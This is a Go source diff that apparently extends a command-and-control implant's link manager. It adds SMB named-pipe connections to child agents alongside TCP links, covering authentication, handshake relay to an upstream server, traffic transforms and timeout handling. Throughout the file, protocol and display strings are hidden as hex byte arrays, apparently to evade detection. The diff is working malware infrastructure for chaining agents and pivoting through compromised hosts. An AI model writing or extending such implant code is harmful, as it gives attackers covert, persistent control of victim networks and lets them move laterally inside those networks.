@@ -10,6 +10,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net"
 	"sync"
 	"sync/atomic"
@@ -27,6 +28,8 @@ var (
 	lmTypePong      = string([]byte{0x70, 0x6f, 0x6e, 0x67})                       // pong
 	lmStatusActive  = string([]byte{0x61, 0x63, 0x74, 0x69, 0x76, 0x65})           // active
 	lmStatusInact   = string([]byte{0x69, 0x6e, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65}) // inactive
+	lmAuthPrefix    = string([]byte{0x41, 0x55, 0x54, 0x48, 0x3a})                 // AUTH:
+	lmAuthOK        = string([]byte{0x4f, 0x4b})                                   // OK
 	lmFmtLinks      = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x4c, 0x69, 0x6e, 0x6b, 0x73, 0x20, 0x28, 0x25, 0x64, 0x29, 0x3a, 0x0a}) // Active Links (%d):\n
 	lmFmtLinkRow    = string([]byte{0x20, 0x20, 0x5b, 0x25, 0x73, 0x5d, 0x20, 0x25, 0x73, 0x20, 0x2d, 0x20, 0x25, 0x73, 0x20, 0x28, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x65, 0x64, 0x3a, 0x20, 0x25, 0x73, 0x2c, 0x20, 0x6c, 0x61, 0x73, 0x74, 0x20, 0x73, 0x65, 0x65, 0x6e, 0x3a, 0x20, 0x25, 0x73, 0x29, 0x0a}) //   [%s] %s - %s (connected: %s, last seen: %s)\n
 	lmTimeFmt       = string([]byte{0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 15:04:05
@@ -37,12 +40,13 @@ const (
 	heartbeatInterval = 60 * time.Second // Send ping every 60 seconds
 )
 
-// LinkedAgent represents a connected TCP agent
+// LinkedAgent represents a connected SMB or TCP agent
 type LinkedAgent struct {
 	RoutingID         string    // Short routing ID (assigned by this agent)
-	Address           string    // TCP address (host:port)
-	LinkType          string    // "tcp" for TCP links
-	Conn              net.Conn  // Active TCP connection
+	PipePath          string    // Full pipe path for SMB (\\server\pipe\name)
+	Address           string    // TCP address for TCP links (host:port)
+	LinkType          string    // "smb" or "tcp"
+	Conn              net.Conn  // Active connection (pipe or TCP)
 	Connected         time.Time // When the link was established
 	LastSeen          time.Time // Last successful communication
 	IsActive          bool      // Whether the link is active
@@ -52,14 +56,15 @@ type LinkedAgent struct {
 	mu                sync.Mutex
 }
 
-// LinkManager manages connections to linked TCP agents
+// LinkManager manages connections to linked SMB and TCP agents
 type LinkManager struct {
-	mu            sync.RWMutex
-	links         map[string]*LinkedAgent // routingID -> LinkedAgent
-	addressToRoute map[string]string      // address -> routingID (for dedup)
-	nextID        uint32                  // Atomic counter for generating routing IDs
-	outboundData  chan *LinkDataOut       // Data received from linked agents, to be sent to server
-	handshakeData chan *LinkDataOut       // Handshake data from new linked agents (sent via "lh" field)
+	mu             sync.RWMutex
+	links          map[string]*LinkedAgent // routingID -> LinkedAgent
+	pipeToRoute    map[string]string       // pipePath -> routingID (for SMB dedup)
+	addressToRoute map[string]string       // address -> routingID (for TCP dedup)
+	nextID         uint32                  // Atomic counter for generating routing IDs
+	outboundData   chan *LinkDataOut       // Data received from linked agents, to be sent to server
+	handshakeData  chan *LinkDataOut       // Handshake data from new linked agents (sent via "lh" field)
 
 	// Response channels for synchronous command/response patterns
 	responseChannels map[string]chan *LinkDataOut // routingID -> response channel
@@ -95,7 +100,8 @@ func GetLinkManager() *LinkManager {
 	linkManagerOnce.Do(func() {
 		linkManager = &LinkManager{
 			links:               make(map[string]*LinkedAgent),
-			addressToRoute:     make(map[string]string),
+			pipeToRoute:         make(map[string]string),
+			addressToRoute:      make(map[string]string),
 			outboundData:        make(chan *LinkDataOut, 100),
 			handshakeData:       make(chan *LinkDataOut, 10),
 			responseChannels:    make(map[string]chan *LinkDataOut),
@@ -111,6 +117,98 @@ func GetLinkManager() *LinkManager {
 func (lm *LinkManager) GenerateRoutingID() string {
 	id := atomic.AddUint32(&lm.nextID, 1)
 	return fmt.Sprintf("%x", id)
+}
+
+// Link establishes a connection to an SMB agent via named pipe
+// creds can be nil for anonymous authentication
+func (lm *LinkManager) Link(pipePath string, creds *SMBCredentials) (string, error) {
+	lm.mu.Lock()
+	defer lm.mu.Unlock()
+
+	// Check if already linked to this pipe
+	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
+		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
+			return "", fmt.Errorf(Err(E5))
+		}
+	}
+
+	// Connect to the named pipe via SMB with credentials
+	conn, err := connectToPipe(pipePath, creds)
+	if err != nil {
+		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
+	}
+
+	// Perform lightweight authentication with the SMB agent
+	if err := performLinkAuth(conn); err != nil {
+		conn.Close()
+		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
+	}
+
+	// Generate routing ID
+	routingID := lm.GenerateRoutingID()
+
+	// Create linked agent entry
+	link := &LinkedAgent{
+		RoutingID:         routingID,
+		PipePath:          pipePath,
+		LinkType:          "smb",
+		Conn:              conn,
+		Connected:         time.Now(),
+		LastSeen:          time.Now(),
+		IsActive:          true,
+		AwaitingHandshake: true, // First message after auth is always handshake
+	}
+
+	// Store the link
+	lm.links[routingID] = link
+	lm.pipeToRoute[pipePath] = routingID
+
+	// For SMB links using go-smb2, we CANNOT use a background read goroutine
+	// because go-smb2 doesn't support concurrent read/write on the same file handle.
+	// Instead, read the handshake synchronously here, then use request-response pattern for commands.
+
+	// Read the initial handshake from the SMB agent with timeout
+	handshakeData, err := lm.readWithTimeout(conn, 30*time.Second)
+	if err != nil {
+		conn.Close()
+		delete(lm.links, routingID)
+		delete(lm.pipeToRoute, pipePath)
+		return "", fmt.Errorf(ErrCtx(E10, err.Error()))
+	}
+
+	// Parse handshake message
+	var message map[string]string
+	if err := json.Unmarshal(handshakeData, &message); err == nil && message[lmKeyType] == lmTypeHandshake {
+		// Queue handshake for server via "lh" field
+		outbound := &LinkDataOut{
+			RoutingID: routingID,
+			Payload:   message[lmKeyPayload],
+		}
+		select {
+		case lm.handshakeData <- outbound:
+		default:
+		}
+		link.AwaitingHandshake = false
+	} else {
+		// Raw handshake data (for transforms)
+		outbound := &LinkDataOut{
+			RoutingID: routingID,
+			Payload:   base64.StdEncoding.EncodeToString(handshakeData),
+		}
+		select {
+		case lm.handshakeData <- outbound:
+		default:
+		}
+		link.AwaitingHandshake = false
+	}
+
+	link.LastSeen = time.Now()
+
+	// NOTE: Do NOT start handleIncomingData goroutine for SMB links!
+	// go-smb2 requires synchronous request-response pattern.
+	// Commands will be handled by ForwardToLinkedAgentAndWait which does its own read.
+
+	return routingID, nil
 }
 
 // LinkTCP establishes a connection to a TCP agent
@@ -190,8 +288,12 @@ func (lm *LinkManager) Unlink(routingID string) error {
 	default:
 	}
 
-	// Remove from maps
-	delete(lm.addressToRoute, link.Address)
+	// Remove from maps based on link type
+	if link.LinkType == "tcp" {
+		delete(lm.addressToRoute, link.Address)
+	} else {
+		delete(lm.pipeToRoute, link.PipePath)
+	}
 	delete(lm.links, routingID)
 
 	return nil
@@ -258,10 +360,22 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	// Write length-prefixed message
-	if err := writeMessage(link.Conn, data); err != nil {
+	// Write with timeout using goroutine (SetWriteDeadline doesn't work with go-smb2)
+	conn := link.Conn
+	done := make(chan error, 1)
+	go func() {
+		done <- writeMessage(conn, data)
+	}()
+
+	select {
+	case err := <-done:
+		if err != nil {
+			link.IsActive = false
+			return fmt.Errorf(ErrCtx(E11, err.Error()))
+		}
+	case <-time.After(10 * time.Second):
 		link.IsActive = false
-		return fmt.Errorf(ErrCtx(E11, err.Error()))
+		return fmt.Errorf(Err(E9)) // Timeout error
 	}
 
 	link.LastSeen = time.Now()
@@ -269,7 +383,7 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 }
 
 // ForwardToLinkedAgentRaw sends raw transformed data to a linked agent
-func (lm *LinkManager) ForwardToLinkedAgentRaw(routingID string, data []byte, prepend, append int) error {
+func (lm *LinkManager) ForwardToLinkedAgentRaw(routingID string, data []byte, prepend, appendLen int) error {
 	link, exists := lm.GetLink(routingID)
 	if !exists {
 		return fmt.Errorf(Err(E4))
@@ -284,12 +398,24 @@ func (lm *LinkManager) ForwardToLinkedAgentRaw(routingID string, data []byte, pr
 
 	// Store transform lengths for response handling
 	link.prependLen = prepend
-	link.appendLen = append
+	link.appendLen = appendLen
 
-	// Write raw data directly
-	if err := writeMessage(link.Conn, data); err != nil {
+	// Write with timeout using goroutine (SetWriteDeadline doesn't work with go-smb2)
+	conn := link.Conn
+	done := make(chan error, 1)
+	go func() {
+		done <- writeMessage(conn, data)
+	}()
+
+	select {
+	case err := <-done:
+		if err != nil {
+			link.IsActive = false
+			return fmt.Errorf(ErrCtx(E11, err.Error()))
+		}
+	case <-time.After(10 * time.Second):
 		link.IsActive = false
-		return fmt.Errorf(ErrCtx(E11, err.Error()))
+		return fmt.Errorf(Err(E9)) // Timeout error
 	}
 
 	link.LastSeen = time.Now()
@@ -298,14 +424,25 @@ func (lm *LinkManager) ForwardToLinkedAgentRaw(routingID string, data []byte, pr
 
 // ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
 func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*LinkDataOut, error) {
-	// Create a response channel for this routing ID
+	link, exists := lm.GetLink(routingID)
+	if !exists {
+		return nil, fmt.Errorf(Err(E4))
+	}
+
+	// For SMB links, use synchronous request-response pattern
+	// go-smb2 doesn't support concurrent read/write on the same file handle
+	if link.LinkType == "smb" {
+		return lm.forwardToSMBAgentAndWait(link, payload, timeout)
+	}
+
+	// For TCP links, use the async response channel mechanism
+	// TCP supports concurrent read/write, so handleIncomingData goroutine works
 	respChan := make(chan *LinkDataOut, 1)
 
 	lm.responseMu.Lock()
 	lm.responseChannels[routingID] = respChan
 	lm.responseMu.Unlock()
 
-	// Clean up when done
 	defer func() {
 		lm.responseMu.Lock()
 		delete(lm.responseChannels, routingID)
@@ -326,30 +463,94 @@ func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload str
 	}
 }
 
+// forwardToSMBAgentAndWait handles synchronous request-response for SMB links
+// This is necessary because go-smb2 doesn't support concurrent read/write
+func (lm *LinkManager) forwardToSMBAgentAndWait(link *LinkedAgent, payload string, timeout time.Duration) (*LinkDataOut, error) {
+	link.mu.Lock()
+	defer link.mu.Unlock()
+
+	if link.Conn == nil || !link.IsActive {
+		return nil, fmt.Errorf(Err(E4))
+	}
+
+	// Create the command message
+	message := map[string]string{
+		lmKeyType:    lmTypeData,
+		lmKeyPayload: payload,
+	}
+
+	data, err := json.Marshal(message)
+	if err != nil {
+		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
+	}
+
+	// Write the command with timeout
+	if err := lm.writeWithTimeout(link.Conn, data, timeout); err != nil {
+		link.IsActive = false
+		return nil, fmt.Errorf(ErrCtx(E11, err.Error()))
+	}
+
+	// Read the response with timeout
+	respData, err := lm.readWithTimeout(link.Conn, timeout)
+	if err != nil {
+		link.IsActive = false
+		return nil, fmt.Errorf(ErrCtx(E10, err.Error()))
+	}
+
+	link.LastSeen = time.Now()
+
+	// Parse response - could be JSON envelope or raw transformed data
+	var respMsg map[string]string
+	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType] == lmTypeData {
+		// Legacy JSON envelope format
+		return &LinkDataOut{
+			RoutingID: link.RoutingID,
+			Payload:   respMsg[lmKeyPayload],
+		}, nil
+	}
+
+	// Raw transformed data - base64 encode
+	return &LinkDataOut{
+		RoutingID:     link.RoutingID,
+		Payload:       base64.StdEncoding.EncodeToString(respData),
+		PrependLength: link.prependLen,
+		AppendLength:  link.appendLen,
+	}, nil
+}
+
 // ForwardToLinkedAgentRawAndWait sends raw transformed data to a linked agent and waits for response
 func (lm *LinkManager) ForwardToLinkedAgentRawAndWait(routingID string, payload string, prependLen, appendLen int, timeout time.Duration) (*LinkDataOut, error) {
-	// Create a response channel for this routing ID
+	link, exists := lm.GetLink(routingID)
+	if !exists {
+		return nil, fmt.Errorf(Err(E4))
+	}
+
+	// Decode base64 payload
+	rawData, err := base64.StdEncoding.DecodeString(payload)
+	if err != nil {
+		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
+	}
+
+	// For SMB links, use synchronous request-response pattern
+	if link.LinkType == "smb" {
+		return lm.forwardToSMBAgentRawAndWait(link, rawData, prependLen, appendLen, timeout)
+	}
+
+	// For TCP links, use the async response channel mechanism
 	respChan := make(chan *LinkDataOut, 1)
 
 	lm.responseMu.Lock()
 	lm.responseChannels[routingID] = respChan
 	lm.responseMu.Unlock()
 
-	// Clean up when done
 	defer func() {
 		lm.responseMu.Lock()
 		delete(lm.responseChannels, routingID)
 		lm.responseMu.Unlock()
 	}()
 
-	// Decode base64 payload
-	data, err := base64.StdEncoding.DecodeString(payload)
-	if err != nil {
-		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
-	}
-
 	// Forward the raw data
-	if err := lm.ForwardToLinkedAgentRaw(routingID, data, prependLen, appendLen); err != nil {
+	if err := lm.ForwardToLinkedAgentRaw(routingID, rawData, prependLen, appendLen); err != nil {
 		return nil, err
 	}
 
@@ -360,6 +561,52 @@ func (lm *LinkManager) ForwardToLinkedAgentRawAndWait(routingID string, payload 
 	case <-time.After(timeout):
 		return nil, nil // Timeout is not an error - response will come later via normal queue
 	}
+}
+
+// forwardToSMBAgentRawAndWait handles synchronous raw request-response for SMB links
+func (lm *LinkManager) forwardToSMBAgentRawAndWait(link *LinkedAgent, rawData []byte, prependLen, appendLen int, timeout time.Duration) (*LinkDataOut, error) {
+	link.mu.Lock()
+	defer link.mu.Unlock()
+
+	if link.Conn == nil || !link.IsActive {
+		return nil, fmt.Errorf(Err(E4))
+	}
+
+	// Store transform lengths for response handling
+	link.prependLen = prependLen
+	link.appendLen = appendLen
+
+	// Write raw bytes directly with timeout
+	if err := lm.writeWithTimeout(link.Conn, rawData, timeout); err != nil {
+		link.IsActive = false
+		return nil, fmt.Errorf(ErrCtx(E11, err.Error()))
+	}
+
+	// Read the response with timeout
+	respData, err := lm.readWithTimeout(link.Conn, timeout)
+	if err != nil {
+		link.IsActive = false
+		return nil, fmt.Errorf(ErrCtx(E10, err.Error()))
+	}
+
+	link.LastSeen = time.Now()
+
+	// Parse response - could be JSON envelope or raw transformed data
+	var respMsg map[string]string
+	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType] == lmTypeData {
+		return &LinkDataOut{
+			RoutingID: link.RoutingID,
+			Payload:   respMsg[lmKeyPayload],
+		}, nil
+	}
+
+	// Raw transformed data
+	return &LinkDataOut{
+		RoutingID:     link.RoutingID,
+		Payload:       base64.StdEncoding.EncodeToString(respData),
+		PrependLength: prependLen,
+		AppendLength:  appendLen,
+	}, nil
 }
 
 // GetOutboundData returns data that needs to be sent to the server
@@ -418,66 +665,94 @@ func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
 			return
 		}
 
-		// Parse the message
+		// Try to parse as legacy JSON format first
 		var message map[string]string
-		if err := json.Unmarshal(data, &message); err != nil {
-			continue
-		}
-
-		switch message[lmKeyType] {
-		case lmTypeData:
-			// Build outbound data
-			outbound := &LinkDataOut{
-				RoutingID:     link.RoutingID,
-				Payload:       message[lmKeyPayload],
-				PrependLength: link.prependLen,
-				AppendLength:  link.appendLen,
-			}
-
-			// Check if someone is waiting synchronously for this response
-			lm.responseMu.RLock()
-			respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
-			lm.responseMu.RUnlock()
-
-			if hasSyncWaiter {
-				// Send to synchronous waiter (non-blocking)
-				select {
-				case respChan <- outbound:
-				default:
-					// Channel full or closed, fall back to async queue
-					lm.queueOutboundData(outbound)
+		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType] != "" {
+			// Successfully parsed as JSON with type field - legacy format
+			switch message[lmKeyType] {
+			case lmTypeData:
+				// Build outbound data
+				outbound := &LinkDataOut{
+					RoutingID: link.RoutingID,
+					Payload:   message[lmKeyPayload],
 				}
-			} else {
-				// No synchronous waiter, queue for normal async processing
-				lm.queueOutboundData(outbound)
-			}
+				lm.deliverOutbound(link, outbound)
 
-		case lmTypeHandshake:
-			// Initial handshake from TCP agent - queue for server via "lh" field
-			outbound := &LinkDataOut{
-				RoutingID: link.RoutingID,
-				Payload:   message[lmKeyPayload],
-			}
-			select {
-			case lm.handshakeData <- outbound:
-			default:
-			}
+			case lmTypeHandshake:
+				// Initial handshake from SMB/TCP agent - queue for server via "lh" field
+				outbound := &LinkDataOut{
+					RoutingID: link.RoutingID,
+					Payload:   message[lmKeyPayload],
+				}
+				select {
+				case lm.handshakeData <- outbound:
+				default:
+				}
 
-			// Clear handshake state after receiving JSON handshake
+				// Clear handshake state after receiving JSON handshake
+				link.mu.Lock()
+				link.AwaitingHandshake = false
+				link.mu.Unlock()
+
+			case lmTypePong:
+				// Heartbeat response from child agent - just update LastSeen
+
+			case lmTypeDisconn:
+				return
+			}
+		} else {
+			// Not valid JSON or no type field - treat as raw transformed data
+			// Child agent sent pre-transformed blob, base64 encode and forward
 			link.mu.Lock()
-			link.AwaitingHandshake = false
+			isHandshake := link.AwaitingHandshake
+			prependLen := link.prependLen
+			appendLen := link.appendLen
+			link.AwaitingHandshake = false // First message consumed
 			link.mu.Unlock()
 
-		case lmTypePong:
-			// Heartbeat response from TCP child - just update LastSeen
+			outbound := &LinkDataOut{
+				RoutingID:     link.RoutingID,
+				Payload:       base64.StdEncoding.EncodeToString(data),
+				PrependLength: prependLen,
+				AppendLength:  appendLen,
+			}
 
-		case lmTypeDisconn:
-			return
+			if isHandshake {
+				// First message after auth = handshake (for agents that send opaque handshakes)
+				select {
+				case lm.handshakeData <- outbound:
+				default:
+				}
+			} else {
+				// Subsequent messages = data
+				lm.deliverOutbound(link, outbound)
+			}
 		}
 
 		link.mu.Lock()
 		link.LastSeen = time.Now()
 		link.mu.Unlock()
+	}
+}
+
+// deliverOutbound delivers data to synchronous waiter or queues for async processing
+func (lm *LinkManager) deliverOutbound(link *LinkedAgent, outbound *LinkDataOut) {
+	// Check if someone is waiting synchronously for this response
+	lm.responseMu.RLock()
+	respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
+	lm.responseMu.RUnlock()
+
+	if hasSyncWaiter {
+		// Send to synchronous waiter (non-blocking)
+		select {
+		case respChan <- outbound:
+		default:
+			// Channel full or closed, fall back to async queue
+			lm.queueOutboundData(outbound)
+		}
+	} else {
+		// No synchronous waiter, queue for normal async processing
+		lm.queueOutboundData(outbound)
 	}
 }
 
@@ -497,6 +772,48 @@ func (lm *LinkManager) queueHandshakeData(data *LinkDataOut) {
 	}
 }
 
+// readWithTimeout reads a message from conn with a timeout using a goroutine
+// This is necessary for go-smb2 because SetReadDeadline doesn't work on SMB2 file handles
+func (lm *LinkManager) readWithTimeout(conn net.Conn, timeout time.Duration) ([]byte, error) {
+	dataChan := make(chan []byte, 1)
+	errChan := make(chan error, 1)
+
+	go func() {
+		data, err := readMessage(conn)
+		if err != nil {
+			errChan <- err
+		} else {
+			dataChan <- data
+		}
+	}()
+
+	select {
+	case data := <-dataChan:
+		return data, nil
+	case err := <-errChan:
+		return nil, err
+	case <-time.After(timeout):
+		return nil, fmt.Errorf(Err(E9)) // Timeout
+	}
+}
+
+// writeWithTimeout writes a message to conn with a timeout using a goroutine
+// This is necessary for go-smb2 because SetWriteDeadline doesn't work on SMB2 file handles
+func (lm *LinkManager) writeWithTimeout(conn net.Conn, data []byte, timeout time.Duration) error {
+	done := make(chan error, 1)
+
+	go func() {
+		done <- writeMessage(conn, data)
+	}()
+
+	select {
+	case err := <-done:
+		return err
+	case <-time.After(timeout):
+		return fmt.Errorf(Err(E9)) // Timeout
+	}
+}
+
 // ListLinks returns a summary of all linked agents
 func (lm *LinkManager) ListLinks() string {
 	lm.mu.RLock()
@@ -512,8 +829,13 @@ func (lm *LinkManager) ListLinks() string {
 		if !link.IsActive {
 			status = lmStatusInact
 		}
+		// Show pipe path for SMB, address for TCP
+		displayPath := link.Address
+		if link.LinkType == "smb" {
+			displayPath = link.PipePath
+		}
 		result += fmt.Sprintf(lmFmtLinkRow,
-			routingID, link.Address, status,
+			routingID, displayPath, status,
 			link.Connected.Format(lmTimeFmt),
 			link.LastSeen.Format(lmTimeFmt))
 	}
@@ -547,9 +869,10 @@ func writeMessage(conn net.Conn, data []byte) error {
 }
 
 func readMessage(conn net.Conn) ([]byte, error) {
-	// Read 4-byte length header
+	// Read 4-byte length header using io.ReadFull to handle partial reads
+	// This is critical for SMB pipes where reads may return fewer bytes than requested
 	header := make([]byte, 4)
-	if _, err := conn.Read(header); err != nil {
+	if _, err := io.ReadFull(conn, header); err != nil {
 		return nil, err
 	}
 
@@ -560,15 +883,10 @@ func readMessage(conn net.Conn) ([]byte, error) {
 		return nil, fmt.Errorf(Err(E2))
 	}
 
-	// Read data
+	// Read data using io.ReadFull
 	data := make([]byte, length)
-	totalRead := 0
-	for totalRead < int(length) {
-		n, err := conn.Read(data[totalRead:])
-		if err != nil {
-			return nil, err
-		}
-		totalRead += n
+	if _, err := io.ReadFull(conn, data); err != nil {
+		return nil, err
 	}
 
 	return data, nil
@@ -598,6 +916,11 @@ func (lm *LinkManager) pingAllLinks() {
 	lm.mu.RUnlock()
 
 	for _, link := range links {
+		// Skip heartbeats for SMB links - go-smb2 requires synchronous request-response
+		// and we can't read the pong without interfering with command responses
+		if link.LinkType == "smb" {
+			continue
+		}
 		lm.sendPing(link)
 	}
 }
